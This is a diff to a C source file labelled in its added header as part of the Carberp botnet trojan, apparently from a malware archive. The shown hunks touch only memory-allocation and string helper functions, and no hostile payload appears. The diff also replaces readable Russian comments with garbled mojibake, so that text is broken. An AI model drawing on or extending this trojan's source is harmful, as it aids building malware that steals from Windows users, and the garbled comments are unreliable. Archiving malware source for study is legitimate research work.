@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <tlhelp32.h>
 
@@ -69,7 +80,7 @@ LPVOID MemAlloc( DWORD dwSize )
 
 LPVOID MemAllocAndClear(DWORD Size)
 {
-	// Выделить и очистить память указанного размера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Size == 0)
     	return NULL;
 
@@ -97,21 +108,21 @@ LPVOID MemAllocAndClear(DWORD Size)
 
 LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize )
 {
-    // Изменяем размер выделенного буфера памяти
+    // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DWORD PrevLen = 0;
 
-	// Определяем размер предыдущего блока
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if ( lpAddr )
 		PrevLen = GetMemSize(lpAddr);
 
-	//  Создаём новый буфер
+	//  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	LPVOID NewAddr = NULL;
 	if (dwSize > 0)
 	{
 		NewAddr = MemAlloc(dwSize);
 		if (lpAddr && NewAddr && PrevLen)
 		{
-            // Копируем старую память
+            // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			if (dwSize < PrevLen)
             	PrevLen = dwSize;
 			m_memcpy(NewAddr, lpAddr, PrevLen);
@@ -178,7 +189,7 @@ wchar_t *m_wcsncpy( wchar_t *dest, wchar_t *src, unsigned long n )
 
 PCHAR FindChar(PCHAR Str, char C)
 {
-	// Функция возвращает указатель на символ С;
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ;
 	if (Str == NULL)
 		return NULL;
 	PCHAR Tmp = Str;
